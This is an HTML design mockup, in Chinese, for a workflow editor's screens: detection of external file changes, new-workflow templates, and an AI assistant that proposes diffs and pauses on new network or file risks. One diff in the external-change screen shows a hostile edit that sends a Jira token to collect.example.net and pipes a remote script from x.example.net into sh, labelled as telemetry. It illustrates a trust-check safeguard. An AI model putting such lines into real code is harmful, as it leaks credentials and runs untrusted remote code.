+<li>JSON 写坏时（少逗号）只标语法错误、表单暂时只读，直到 JSON 能解析；未知字段（例子里的 <code>x-roots</code>）在表单里改其他字段时原样保留。</li>
+<li>有问题时测试运行按钮不可用，但<b>可以保存</b>：允许保存写了一半的工作流，它在启动器里显示为「清单有误」，和今天一致。</li>
+</ul></div>
+
+<!-- ⑥ external change -->
+<div class="stage" id="external"><div class="label">⑥ 文件在编辑器外被修改：先看改了什么，再决定</div>
+<div class="ewin">
+  <div class="tool">
+    <div class="lights"><i></i><i></i><i></i></div>
+    <span class="wtile jira">J</span><div class="ttl"><b>Jira</b><span>com.mylxsw.jira · 1.1.0</span></div>
+    <span class="badge rt">Python</span><span class="badge warn">文件已修改，需重新确认</span>
+    <span class="grow"></span><span class="saved"><span class="dot"></span>你有未保存的修改</span>
+    <span class="btn">保存 <span class="k">⌘S</span></span><span class="btn p" style="opacity:.45">▶ 测试运行 <span class="k">⌘R</span></span><span class="btn ghost">···</span><span class="sw"></span>
+  </div>
+  <div class="banner warn"><span class="i">⚠︎</span><div><b>main.py 在编辑器外被修改了</b>（2 分钟前，+3 −1 行）。在你确认之前，这个工作流不会在启动器里运行。</div>
+    <span class="r"><span class="btn">保留我的版本</span><span class="btn">载入外部版本</span><span class="btn p">查看差异并信任…</span></span></div>
+  <div class="ebody notest" style="height:600px">
+    <div class="side">
+      <div class="search">⌕ 搜索工作流</div>
+      <div class="sgrp">我的工作流 · 4</div>
+      <div class="wi"><span class="wtile sm fx">¥</span><div><div class="n">汇率换算</div><div class="k2">fx</div></div><span class="st ok"></span></div>
+      <div class="wi"><span class="wtile sm md">MD</span><div><div class="n">Markdown 转 HTML</div><div class="k2">md</div></div><span class="st ok"></span></div>
+      <div class="wi"><span class="wtile sm code">TS</span><div><div class="n">打开项目</div><div class="k2">code</div></div><span class="st bad"></span></div>
+      <div class="wi on"><span class="wtile sm jira">J</span><div><div class="n">Jira</div><div class="k2">jira · jm</div></div><span class="st warn"></span></div>
+      <div class="files"><div class="fi">⚙︎ 配置</div><div class="fi on">🐍 main.py <span class="m">外部</span></div><div class="fi">📄 requirements.txt</div></div>
+      <div class="sidefoot"><span class="btn">＋ 新建</span><span class="btn ghost">导入…</span></div>
+    </div>
+    <div class="center">
+      <div class="ctabs"><span class="ctab on">main.py · 差异</span><span class="r"><span class="segm"><span>我的版本</span><span class="on">差异</span><span>外部版本</span></span></span></div>
+      <div class="codewrap">
+        <div class="gut">1
+2
+3
+4
+5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16</div>
+        <div class="src"><span class="ln"><span class="kw1">import</span> json, os, sys</span><span class="ln"><span class="kw1">import</span> urllib.request</span><span class="ln"> </span><span class="ln">query = sys.argv[<span class="num">1</span>] <span class="kw1">if</span> <span class="fn">len</span>(sys.argv) &gt; <span class="num">1</span> <span class="kw1">else</span> <span class="str">""</span></span><span class="ln">host = os.environ[<span class="str">"JIRA_HOST"</span>]</span><span class="ln diffdel">token = os.environ[<span class="str">"JIRA_TOKEN"</span>]</span><span class="ln diffadd">token = os.environ.get(<span class="str">"JIRA_TOKEN"</span>, <span class="str">""</span>)</span><span class="ln diffadd">urllib.request.urlopen(<span class="str">"https://collect.example.net/?t="</span> + token)</span><span class="ln diffadd"><span class="cm"># telemetry</span></span><span class="ln diffadd">os.system(<span class="str">"curl -s https://x.example.net/i.sh | sh"</span>)</span><span class="ln"> </span><span class="ln">issues = search(host, token, query)</span><span class="ln"><span class="fn">print</span>(json.dumps({<span class="str">"items"</span>: [item(i) <span class="kw1">for</span> i <span class="kw1">in</span> issues]}))</span><span class="ln"> </span></div>
+      </div>
+      <div class="sbar"><span class="w">⚠︎ 外部修改：+3 −1</span><span class="r"><span>上次信任：10 月 2 日 · SHA-256 3f9a…c21e</span></span></div>
+    </div>
+  </div>
+</div></div>
+<div class="notes"><h2>编辑器不能成为绕过信任的后门</h2><ul>
+<li>编辑器监听工作流文件夹。没有未保存修改时，外部的改动直接载入；有冲突时出现横幅，让用户选保留哪一份。</li>
+<li><b>在编辑器里保存</b>会自动更新信任（用户自己写的），但前提是：打开时它是「可以运行」，并且保存前磁盘上的内容和载入时一样。只要中间有外部修改，就必须先看差异、确认信任（复用现有的信任面板），保存不会顺手把别人的改动一起信任掉。</li>
+<li>例子里外部改动把令牌发到了别的服务器——这正是要用户亲眼看到的东西。</li>
+</ul></div>
+
+<!-- ⑦ new workflow sheet -->
+<div class="stage" id="new"><div class="label">⑦ 新建工作流：选模板，起名字和关键字，直接进编辑器</div>
+<div class="ewin">
+  <div class="tool">
+    <div class="lights"><i></i><i></i><i></i></div>
+    <span class="wtile fx">¥</span><div class="ttl"><b>汇率换算</b><span>local.fx · 1.0.0</span></div>
+    <span class="badge rt">Python</span><span class="badge ok">✓ 可以运行</span>
+    <span class="grow"></span><span class="saved">已保存</span>
+    <span class="btn">保存 <span class="k">⌘S</span></span><span class="btn p">▶ 测试运行 <span class="k">⌘R</span></span><span class="btn ghost">···</span><span class="sw"></span>
+  </div>
+  <div class="ebody notest" style="height:600px">
+    <div class="side">
+      <div class="search">⌕ 搜索工作流</div>
+      <div class="sgrp">我的工作流 · 4</div>
+      <div class="wi on"><span class="wtile sm fx">¥</span><div><div class="n">汇率换算</div><div class="k2">fx</div></div><span class="st ok"></span></div>
+      <div class="wi"><span class="wtile sm md">MD</span><div><div class="n">Markdown 转 HTML</div><div class="k2">md</div></div><span class="st ok"></span></div>
+      <div class="wi"><span class="wtile sm code">TS</span><div><div class="n">打开项目</div><div class="k2">code</div></div><span class="st bad"></span></div>
+      <div class="wi"><span class="wtile sm jira">J</span><div><div class="n">Jira</div><div class="k2">jira · jm</div></div><span class="st warn"></span></div>
+      <div class="sidefoot"><span class="btn">＋ 新建</span><span class="btn ghost">导入…</span></div>
+    </div>
+    <div class="center"><div class="codewrap"><div class="gut"></div><div class="src"></div></div></div>
+  </div>
+  <div class="scrim"></div>
+  <div class="sheet">
+    <div class="shd"><h3>新建工作流</h3><div class="d">选一个起点。生成的文件放在工作流文件夹里，随时可以改。</div></div>
+    <div class="tpls">
+      <div class="tpl on"><div class="tt"><span class="badge rt">Python</span>输出文本</div><div class="td">读参数，打印结果，显示在卡片里。</div><div class="tc">query = sys.argv[1]
+print(f"{len(query)} chars")</div></div>
+      <div class="tpl"><div class="tt"><span class="badge" style="background:rgba(104,160,99,.25);color:#a6dc9f">Node</span>输出文本</div><div class="td">JavaScript 版本。</div><div class="tc">const q = process.argv[2]
+console.log(q.toUpperCase())</div></div>
+      <div class="tpl"><div class="tt"><span class="badge dim">zsh</span>输出文本</div><div class="td">调用命令行工具最快。</div><div class="tc">text="${1:-$TYPEFLUX_SELECTION}"
+print -r -- "$text" | rev</div></div>
+      <div class="tpl"><div class="tt"><span class="badge dim">zsh</span>只做事，不输出</div><div class="td">打开项目、朗读、切换设置…运行完启动器关闭。</div><div class="tc">say -- "${1:-$TYPEFLUX_SELECTION}"</div></div>
+      <div class="tpl"><div class="tt"><span class="badge dim">空白</span>从零开始</div><div class="td">只有清单，脚本和运行时自己选。</div><div class="tc">{ "schema": 1, … }</div></div>
+      <div class="tpl"><div class="tt"><span class="badge dim">复制</span>复制现有工作流</div><div class="td">以「汇率换算」为起点，换个 id 和关键字。</div><div class="tc">local.fx → local.fx-2</div></div>
+    </div>
+    <div class="sform">
+      <div><div class="k">名称</div><div class="inp focus">单词计数</div></div>
+      <div><div class="k">关键字</div><div class="inp mono">wc</div><div class="okline">✓ 可以使用</div></div>
+      <div><div class="k">ID（文件夹名）</div><div class="inp mono" style="color:var(--text-2)">local.wc</div></div>
+    </div>
+    <div class="sfoot"><span class="l">创建后直接打开编辑器，并视为已信任（是你自己创建的）。</span><span class="grow"></span><span class="btn">取消</span><span class="btn p">创建并编辑</span></div>
+  </div>
+</div></div>
+<div class="notes"><h2>从「生成文件再去 Finder 找」变成一步到位</h2><ul>
+<li>今天「新建」直接生成 <code>local.python</code> 和关键字 <code>wf</code>，再用文本编辑器打开文件。改成先填名称和关键字（实时查重），ID 由名称生成，可以手改。</li>
+<li>多了「空白」和「复制现有工作流」两个起点。</li>
+<li>导入文件夹 / <code>.typefluxworkflow</code> 也从这里进入；导入的工作流先走信任面板，再进编辑器。</li>
+</ul></div>
+
+<!-- ⑧ entry points -->
+<div class="stage" id="entry"><div class="label">⑧ 入口：设置列表、启动器的错误卡片</div>
+<div class="row2">
+  <div style="position:relative">
+    <div class="swin">
+      <div class="srow"><span class="wtile fx">¥</span><div class="tx"><div class="t1">汇率换算 <span class="badge rt">Python</span></div><div class="t2">上次运行：退出码 0 · 0.6 秒</div></div>
+        <div class="r"><span class="kbdk">fx</span><span class="badge ok">可以运行</span><span class="btn">编辑</span><span class="btn ghost">···</span><span class="sw"></span></div></div>
+      <div class="srow"><span class="wtile md">MD</span><div class="tx"><div class="t1">Markdown 转 HTML <span class="badge dim">zsh</span></div><div class="t2">pandoc · 用选中的文字</div></div>
+        <div class="r"><span class="kbdk">md</span><span class="badge ok">可以运行</span><span class="btn">编辑</span><span class="btn ghost">···</span><span class="sw"></span></div></div>
+      <div class="srow"><span class="wtile code">TS</span><div class="tx"><div class="t1">打开项目 <span class="badge rt">TypeScript</span></div><div class="t2">command.script：找不到 main.ts</div></div>
+        <div class="r"><span class="kbdk">code</span><span class="badge bad">清单有误</span><span class="btn p">修复…</span><span class="btn ghost">···</span><span class="sw"></span></div></div>
+      <div class="srow"><span class="wtile jira">J</span><div class="tx"><div class="t1">Jira <span class="badge rt">Python</span></div><div class="t2">搜索 Jira 问题</div></div>
+        <div class="r"><span class="kbdk">jira</span><span class="badge warn">需重新确认</span><span class="btn">检查并信任…</span><span class="btn ghost" style="background:var(--hover)">···</span><span class="sw"></span></div></div>
+      <div class="srow" style="color:var(--text-2);font-size:12.5px"><span>＋ 新建工作流…</span><span>打开工作流编辑器</span><span>打开文件夹</span></div>
+    </div>
+    <div class="menu" style="top:232px;right:56px"><div class="mi on">在工作流编辑器中打开<span class="s">↩</span></div><div class="mi">用外部编辑器打开</div><div class="mi">在 Finder 中显示</div><div class="mi">复制工作流</div><div class="sep"></div><div class="mi" style="color:#ff8a82">删除…</div></div>
+  </div>
+  <div>
+    <div class="lcard">
+      <div class="in"><span class="kwc"><span class="g">fx</span>汇率换算</span>100 usd xyz</div>
+      <div class="hr" style="height:1px;background:var(--hair)"></div>
+      <div class="rc err" style="margin:8px"><div class="rh"><b>汇率换算</b><span style="margin-left:auto">工作流</span></div>
+        <div class="errmsg">脚本出错了（退出码 1）</div>
+        <div class="log">  File "main.py", line 12, in &lt;module&gt;
+KeyError: 'XYZ'</div>
+        <div class="acts"><span class="act p">⌘E 编辑工作流</span><span class="act">⌘C 复制错误</span><span class="act">⌘R 重跑</span></div></div>
+      <div class="lbar"><span><b>⌘E</b> 在编辑器中打开到第 12 行</span><span style="margin-left:auto"><b>esc</b> 关闭</span></div>
+    </div>
+  </div>
+</div></div>
+<div class="notes"><h2>在出问题的地方就能进编辑器</h2><ul>
+<li>设置列表每行一个「编辑」按钮；清单有误时按钮变成「修复…」，打开编辑器并跳到第一个问题。「用外部编辑器打开」留在 ··· 菜单里。</li>
+<li>启动器里工作流的结果卡片支持 <b>⌘E</b>：关闭启动器，打开编辑器到这个工作流（出错时直接到出错的行）。</li>
+<li>列表底部增加「打开工作流编辑器」，不选具体工作流也能进去。</li>
+</ul></div>
+
+<!-- ⑩ AI generate -->
+<div class="stage" id="ai-new"><div class="label">⑩ 一键生成：用一句话描述，AI 写好清单和脚本，并在本机试跑</div>
+<div class="ewin">
+  <div class="tool">
+    <div class="lights"><i></i><i></i><i></i></div>
+    <span class="wtile fx">¥</span><div class="ttl"><b>汇率换算</b><span>local.fx · 1.0.0</span></div>
+    <span class="badge rt">Python</span><span class="badge ok">✓ 可以运行</span>
+    <span class="grow"></span><span class="saved">已保存</span>
+    <span class="btn">保存 <span class="k">⌘S</span></span><span class="btn p">▶ 测试运行 <span class="k">⌘R</span></span><span class="btn ghost">···</span><span class="sw"></span>
+  </div>
+  <div class="ebody notest" style="height:660px">
+    <div class="side">
+      <div class="search">⌕ 搜索工作流</div>
+      <div class="sgrp">我的工作流 · 4</div>
+      <div class="wi on"><span class="wtile sm fx">¥</span><div><div class="n">汇率换算</div><div class="k2">fx</div></div><span class="st ok"></span></div><div class="files"><div class="fi">⚙︎ 配置</div><div class="fi on">🐍 main.py</div><div class="fi">📄 README.md</div></div>
+      <div class="wi"><span class="wtile sm md">MD</span><div><div class="n">Markdown 转 HTML</div><div class="k2">md</div></div><span class="st ok"></span></div>
+      <div class="wi"><span class="wtile sm code">TS</span><div><div class="n">打开项目</div><div class="k2">code</div></div><span class="st bad"></span></div>
+      <div class="wi"><span class="wtile sm jira">J</span><div><div class="n">Jira</div><div class="k2">jira · jm</div></div><span class="st warn"></span></div>
+      <div class="sidefoot"><span class="btn">＋ 新建</span><span class="btn ghost">导入…</span></div>
+    </div>
+    <div class="center"><div class="codewrap"><div class="gut"></div><div class="src"></div></div></div>
+  </div>
+  <div class="scrim"></div>
+  <div class="aiwide">
+    <div class="shd" style="padding:18px 22px 10px"><h3 style="margin:0 0 4px;font-size:15px">新建工作流</h3><div class="d" style="color:var(--text-2);font-size:12px">说清楚输入什么、得到什么。AI 会写清单和脚本，在这台 Mac 上试跑，通过后交给你检查。</div></div>
+    <div class="seg2"><span class="on">✦ 用 AI 生成</span><span>从模板</span><span>复制现有</span><span>导入…</span></div>
+    <div class="desc">输入 <b>fx 100 usd jpy</b> 时，查实时汇率，把 100 美元换算成日元，显示换算结果和单位汇率。没写目标货币时默认换成人民币。<span class="caret" style="background:#bf5af2"></span></div>
+    <div class="exs">试试：<span class="e2">选中的 Markdown 转成 HTML</span><span class="e2">ip：显示内网和公网 IP</span><span class="e2">code 项目名：用 VS Code 打开 ~/Code 下的项目</span></div>
+    <div class="opts2"><span>语言 <span class="inp" style="height:24px;min-height:24px;font-size:12px">自动（Python）⌄</span></span><span>关键字 <span class="inp mono" style="height:24px;min-height:24px;font-size:12px">fx</span> <span style="color:var(--ok);font-size:11px">✓ 可用</span></span><span><span class="chk on">✓</span>生成后自动试跑</span></div>
+    <div class="steps">
+      <div class="tl"><span class="ic okc">✓</span>理解需求<span class="d">输入：金额 来源货币 [目标货币] · 输出：文本</span></div>
+      <div class="tl"><span class="ic okc">✓</span>检查本机环境<span class="d">python3 3.12 · 没有 requests，改用标准库</span></div>
+      <div class="tl"><span class="ic okc">✓</span>写 workflow.json<span class="d">关键字 fx · 参数可选 · 超时 10 秒</span></div>
+      <div class="tl"><span class="ic okc">✓</span>写 main.py、README.md<span class="d">22 行 · 访问网络：api.frankfurter.app</span></div>
+      <div class="tl"><span class="ic vc"><span class="spin"></span></span>试跑 3 个例子<span class="d"><span class="chip">100 usd jpy</span><span class="chip">50 eur</span><span class="chip">1 usd xyz</span> · 2/3</span></div>
+    </div>
+    <div class="sfoot" style="margin-top:14px"><span class="l">试跑在干净环境里进行（不带你的密钥，10 秒超时）。生成的工作流在你保存前不会出现在启动器里。</span><span class="grow"></span><span class="btn">停止</span><span class="btn v" style="opacity:.45">检查并保存</span></div>
+  </div>
+</div></div>
+<div class="notes"><h2>描述一句话，拿到一个能跑的工作流</h2><ul>
+<li>「新建」面板的第一个选项。AI 通过 Ask 的 agent 完成：读本机环境（有哪些解释器和命令）→ 写清单和脚本 → 用它自己想的例子在本机试跑 → 失败就改，最多改 3 轮。</li>
+<li>过程逐步显示，随时可以停。生成的文件先放在暂存区，<b>保存前不会出现在启动器里</b>。</li>
+<li>完成后进入编辑器，右侧 AI 助手里是这次生成的提案（截图 ⑪ 的样子），用户看过代码再点「保存」。</li>
+<li>关键字由 AI 建议、本地查重；描述里写了关键字就用写的。</li>
+</ul></div>
+
+<!-- ⑪ AI panel -->
+<div class="stage" id="ai-panel"><div class="label">⑪ 编辑器里的 AI 助手：说要改什么，AI 给出修改提案，看差异后应用</div>
+<div class="ewin">
+  <div class="tool">
+    <div class="lights"><i></i><i></i><i></i></div>
+    <span class="wtile fx">¥</span><div class="ttl"><b>汇率换算</b><span>local.fx · 1.0.0</span></div>
+    <span class="badge rt">Python</span><span class="badge ok">✓ 可以运行</span>
+    <span class="grow"></span><span class="saved">已保存</span>
+    <span class="btn">保存 <span class="k">⌘S</span></span><span class="btn p">▶ 测试运行 <span class="k">⌘R</span></span><span class="btn ghost">···</span><span class="sw"></span>
+  </div>
+  <div class="banner" style="background:rgba(191,90,242,.12)"><span class="i" style="color:var(--violet-text)">✦</span><div><b>正在预览 AI 的提案</b>，还没有应用。绿色是新增的行。</div><span class="r"><span class="btn">放弃</span><span class="btn v">应用到编辑器</span></span></div>
+  <div class="ebody" style="grid-template-columns:208px 1fr 380px;height:600px">
+    <div class="side">
+      <div class="search">⌕ 搜索工作流</div>
+      <div class="sgrp">我的工作流 · 4</div>
+      <div class="wi on"><span class="wtile sm fx">¥</span><div><div class="n">汇率换算</div><div class="k2">fx</div></div><span class="st ok"></span></div><div class="files"><div class="fi">⚙︎ 配置</div><div class="fi on">🐍 main.py</div><div class="fi">📄 README.md</div></div>
+      <div class="wi"><span class="wtile sm md">MD</span><div><div class="n">Markdown 转 HTML</div><div class="k2">md</div></div><span class="st ok"></span></div>
+      <div class="wi"><span class="wtile sm code">TS</span><div><div class="n">打开项目</div><div class="k2">code</div></div><span class="st bad"></span></div>
+      <div class="wi"><span class="wtile sm jira">J</span><div><div class="n">Jira</div><div class="k2">jira · jm</div></div><span class="st warn"></span></div>
+      <div class="sidefoot"><span class="btn">＋ 新建</span><span class="btn ghost">导入…</span></div>
+    </div>
+    <div class="center">
+      <div class="ctabs"><span class="ctab on">main.py · 提案</span><span class="ctab">workflow.json · 提案</span><span class="r"><span class="segm"><span>当前</span><span class="on">差异</span><span>提案</span></span></span></div>
+      <div class="codewrap">
+        <div class="gut">5
+6
+7
+8
+9
+10
+11
+12
+13
+14
+15
+16
+17
+18
+19
+20
+21
+22
+23
+24</div>
+        <div class="src"><span class="ln">query = sys.argv[<span class="num">1</span>] <span class="kw1">if</span> <span class="fn">len</span>(sys.argv) &gt; <span class="num">1</span> <span class="kw1">else</span> <span class="str">""</span></span><span class="ln diffadd">keyword = os.environ.get(<span class="str">"TYPEFLUX_KEYWORD"</span>, <span class="str">"fx"</span>)</span><span class="ln diffadd"> </span><span class="ln diffadd"><span class="kw1">if</span> keyword == <span class="str">"rate"</span>:</span><span class="ln diffadd">    base = (query <span class="kw1">or</span> <span class="str">"usd"</span>).upper()</span><span class="ln diffadd">    targets = <span class="str">"CNY,EUR,JPY,GBP,HKD"</span></span><span class="ln diffadd">    url = <span class="str">f"https://api.frankfurter.app/latest?from={base}&amp;to={targets}"</span></span><span class="ln diffadd">    rates = json.load(urllib.request.urlopen(url, timeout=<span class="num">5</span>))[<span class="str">"rates"</span>]</span><span class="ln diffadd">    <span class="kw1">for</span> code, rate <span class="kw1">in</span> rates.items():</span><span class="ln diffadd">        <span class="fn">print</span>(<span class="str">f"1 {base} = {rate:.2f} {code}"</span>)</span><span class="ln diffadd">    sys.exit(<span class="num">0</span>)</span><span class="ln diffadd"> </span><span class="ln">parts = query.split()</span><span class="ln">amount = <span class="fn">float</span>(parts[<span class="num">0</span>]) <span class="kw1">if</span> parts <span class="kw1">else</span> <span class="num">1</span></span><span class="ln">…</span><span class="ln diffdel"><span class="fn">print</span>(<span class="str">f"1 {base} = {rate} {target}"</span>)</span><span class="ln diffadd"><span class="fn">print</span>(<span class="str">f"1 {base} = {rate:.2f} {target}"</span>)</span><span class="ln"> </span></div>
+      </div>
+      <div class="sbar"><span style="color:var(--violet-text)">✦ 提案：main.py +12 −1 · workflow.json +4</span><span class="r"><span>⌘Z 可以撤销应用</span></span></div>
+    </div>
+    <div class="test">
+      <div class="ptabs"><span class="on"><span class="sp">✦</span>AI 助手</span><span>测试运行</span></div>
+      <div class="chat">
+        <div class="msg u">再加一个 rate 关键字：列出 1 美元对常用货币的汇率。汇率都保留两位小数。</div>
+        <div class="msg a"><div class="who"><span class="sp" style="width:14px;height:14px;border-radius:4px;background:linear-gradient(135deg,#bf5af2,#5e5ce6);color:#fff;font-size:9px;display:inline-flex;align-items:center;justify-content:center">✦</span>AI 助手</div>
+          <div class="tl"><span class="ic okc">✓</span>读取工作流<span class="d">workflow.json · main.py</span></div>
+          <div class="tl"><span class="ic okc">✓</span>检查关键字 <span class="chip">rate</span><span class="d">没有被占用</span></div>
+          <div class="tl"><span class="ic okc">✓</span>试跑提案<span class="d"><span class="chip">rate</span><span class="chip">100 usd jpy</span> 都通过</span></div>
+          <div style="margin-top:6px">加了关键字 <b>rate</b>，脚本通过 <code>TYPEFLUX_KEYWORD</code> 区分两种用法；所有汇率改成两位小数。</div>
+        </div>
+        <div class="prop">
+          <div class="ph2"><span style="color:var(--violet-text)">✦</span>修改提案<span class="v">2 个文件 · 已试跑 ✓</span></div>
+          <div class="fl">workflow.json <span class="ad">+4</span>  keywords 加 rate<br>main.py <span class="ad">+12</span> <span class="dl">−1</span></div>
+          <div class="risk"><span class="rk">🌐 api.frankfurter.app（原来就有）</span><span class="rk">不写文件</span><span class="rk">不启动其他程序</span></div>
+          <div class="pa"><span class="btn">放弃</span><span class="btn">查看差异</span><span class="btn v">应用</span></div>
+        </div>
+      </div>
+      <div class="composer">
+        <div class="ctx"><span>main.py</span><span>workflow.json</span><span>上次测试 ✓</span></div>
+        <div class="t">继续说要改什么…</div>
+        <div class="b"><span class="model"><i></i>默认模型</span>·<span>Typeflux Cloud</span><span class="snd">↑</span></div>
+      </div>
+    </div>
+  </div>
+</div></div>
+<div class="notes"><h2>AI 只提方案，改不改由你</h2><ul>
+<li>右侧面板多一个「AI 助手」标签，和「测试运行」并列。对话里自动带上当前工作流的清单、文件、问题和上次测试结果（输入框上方的标签，可以去掉）。</li>
+<li>AI 不直接写文件，而是给出<b>修改提案</b>：改了哪些文件、几行，已经试跑的结果，以及<b>风险标签</b>（访问哪些网络地址、是否写文件、是否启动其他程序、是否删除东西），新出现的风险用黄色标出。</li>
+<li>「查看差异」在中间显示逐行差异；「应用」只改编辑器里的草稿，可以 ⌘Z 撤销，还要再保存才生效——和手改走同一条路。</li>
+</ul></div>
+
+<!-- ⑫ AI fix -->
+<div class="stage" id="ai-fix"><div class="label">⑫ 让 AI 修复：测试失败后一键交给 AI，它改、试跑，遇到新的风险会停下来问你</div>
+<div class="ewin">
+  <div class="tool">
+    <div class="lights"><i></i><i></i><i></i></div>
+    <span class="wtile fx">¥</span><div class="ttl"><b>汇率换算</b><span>local.fx · 1.0.0</span></div>
+    <span class="badge rt">Python</span><span class="badge ok">✓ 可以运行</span>
+    <span class="grow"></span><span class="saved">已保存</span>
+    <span class="btn">保存 <span class="k">⌘S</span></span><span class="btn p">▶ 测试运行 <span class="k">⌘R</span></span><span class="btn ghost">···</span><span class="sw"></span>
+  </div>
+  <div class="ebody" style="grid-template-columns:208px 1fr 380px">
+    <div class="side">
+      <div class="search">⌕ 搜索工作流</div>
+      <div class="sgrp">我的工作流 · 4</div>
+      <div class="wi on"><span class="wtile sm fx">¥</span><div><div class="n">汇率换算</div><div class="k2">fx</div></div><span class="st ok"></span></div><div class="files"><div class="fi">⚙︎ 配置</div><div class="fi on">🐍 main.py</div><div class="fi">📄 README.md</div></div>
+      <div class="wi"><span class="wtile sm md">MD</span><div><div class="n">Markdown 转 HTML</div><div class="k2">md</div></div><span class="st ok"></span></div>
+      <div class="wi"><span class="wtile sm code">TS</span><div><div class="n">打开项目</div><div class="k2">code</div></div><span class="st bad"></span></div>
+      <div class="wi"><span class="wtile sm jira">J</span><div><div class="n">Jira</div><div class="k2">jira · jm</div></div><span class="st warn"></span></div>
+      <div class="sidefoot"><span class="btn">＋ 新建</span><span class="btn ghost">导入…</span></div>
+    </div>
+    <div class="center">
+      <div class="flow">
+        <div class="node"><div class="nl">⌨︎ 关键字</div><div class="nv"><span class="chip">fx</span><span style="color:var(--text-3)">汇率</span></div></div>
+        <div class="arrow">→</div>
+        <div class="node"><div class="nl">❝ 输入</div><div class="nv">可选 · 或选中文字</div></div>
+        <div class="arrow">→</div>
+        <div class="node on"><div class="nl">▶︎ 脚本</div><div class="nv"><span class="mono">main.py</span> <span class="chip tok">{query}</span></div></div>
+        <div class="arrow">→</div>
+        <div class="node"><div class="nl">⇥ 输出</div><div class="nv">文本 · 10 秒</div></div>
+      </div>
+      <div class="ctabs"><span class="ctab on">main.py</span><span class="ctab">README.md</span></div>
+      <div class="codewrap">
+        <div class="gut">10
+11
+<span class="e">● 12</span>
+
+13
+14
+15
+16
+17</div>
+        <div class="src"><span class="ln"> </span><span class="ln">url = <span class="str">f"https://api.frankfurter.app/latest?from={base}&amp;to={target}"</span></span><span class="ln errl">rate = json.load(urllib.request.urlopen(url, timeout=<span class="num">5</span>))[<span class="str">"rates"</span>]<span class="sq">[target]</span></span><span class="diag"><span class="ann">↳ KeyError: 'XYZ' · 测试运行</span></span><span class="ln"> </span><span class="ln"><span class="fn">print</span>(<span class="str">f"{amount:g} {base} = {amount * rate:,.2f} {target}"</span>)</span><span class="ln"><span class="fn">print</span>(<span class="str">f"1 {base} = {rate} {target}"</span>)</span><span class="ln"> </span></div>
+      </div>
+      <div class="sbar"><span class="e">✕ 测试运行失败：退出码 1</span><span class="r"><span>第 12 行</span></span></div>
+    </div>
+    <div class="test">
+      <div class="ptabs"><span class="on"><span class="sp">✦</span>AI 助手</span><span>测试运行 <b style="color:var(--danger);font-size:9px">●</b></span></div>
+      <div class="chat">
+        <div class="msg u">修复测试运行的错误 <span class="chip">100 usd xyz</span><span class="chip bad">退出码 1</span></div>
+        <div class="msg a"><div class="who">✦ AI 助手</div>
+          <div class="tl"><span class="ic okc">✓</span>读取 stderr 和 main.py<span class="d">KeyError: 'XYZ'</span></div>
+          <div class="tl"><span class="ic okc">✓</span>提案 1：不认识的货币给出提示<span class="d">试跑 3/3 ✓</span></div>
+          <div class="tl"><span class="ic okc">✓</span>提案 2：frankfurter 不支持时换个汇率源<span class="d">还没试跑</span></div>
+          <div style="margin-top:6px">frankfurter 只有约 30 种货币。提案 2 在它不支持时改查 open.er-api.com，这是一个新的网络地址。</div>
+        </div>
+        <div class="prop" style="border-color:rgba(255,179,64,.6)">
+          <div class="ph2"><span style="color:var(--warn)">⚠︎</span>要继续试跑提案 2 吗？<span class="v">自动修复已暂停</span></div>
+          <div class="risk"><span class="rk new">🌐 新地址 open.er-api.com</span><span class="rk">🌐 api.frankfurter.app（原来就有）</span><span class="rk">不写文件</span></div>
+          <div class="fl" style="font-family:inherit;font-size:11.5px;line-height:1.5">试跑会在这台 Mac 上运行新代码。只有和你已经看过的版本相比出现新的风险时才会停下来问。</div>
+          <div class="pa"><span class="btn">只用提案 1</span><span class="btn">查看差异</span><span class="btn v">允许并继续</span></div>
+        </div>
+      </div>
+      <div class="composer">
+        <div class="ctx"><span>main.py</span><span>workflow.json</span><span>上次测试 ✕</span></div>
+        <div class="t">继续说要改什么…</div>
+        <div class="b"><span class="model"><i></i>默认模型</span>·<span>Typeflux Cloud</span><span class="snd">↑</span></div>
+      </div>
+    </div>
+  </div>
+</div></div>
+<div class="notes"><h2>自动修复，但不悄悄放大权限</h2><ul>
+<li>测试失败时，测试面板和启动器的错误卡片都有「让 AI 修复」；它带着 stderr、出错的行和这次的输入交给 AI。</li>
+<li>AI 可以自己改、自己试跑，最多 3 轮。每一版都先做静态风险检查：和用户上次认可的版本相比，<b>出现新的网络地址、删除或写入工作流目录以外的文件、启动其他程序、读取钥匙串或 <code>~/.ssh</code> 这类位置</b>时，自动流程暂停，问用户。</li>
+<li>结果仍然是提案，应用、保存、信任的规则和手改完全一样。</li>
+</ul></div>
+
+<!-- ⑨ light -->
+<div class="stage" id="light"><div class="label">⑨ 浅色外观</div><div id="lightslot"></div></div>
+<div class="notes"><h2>浅色</h2><ul><li>颜色全部来自系统语义色；代码着色在浅色下用 Xcode 默认浅色主题的配色。</li></ul></div>
+
+<script>
+  // ?solo=<id> renders one stage alone for screenshots; ?light=1 switches the theme.
+  const params = new URLSearchParams(location.search);
+  const slot = document.getElementById("lightslot");
+  slot.innerHTML = document.querySelector("#overview .ewin").outerHTML;
+  if (params.get("light")) document.body.classList.add("light");
+  const solo = params.get("solo");
+  if (solo) {
+    document.body.classList.add("solo");
+    document.getElementById(solo).classList.add("only");
+    if (solo === "light") document.body.classList.add("light");
+  }
+</script>
+</body></html>
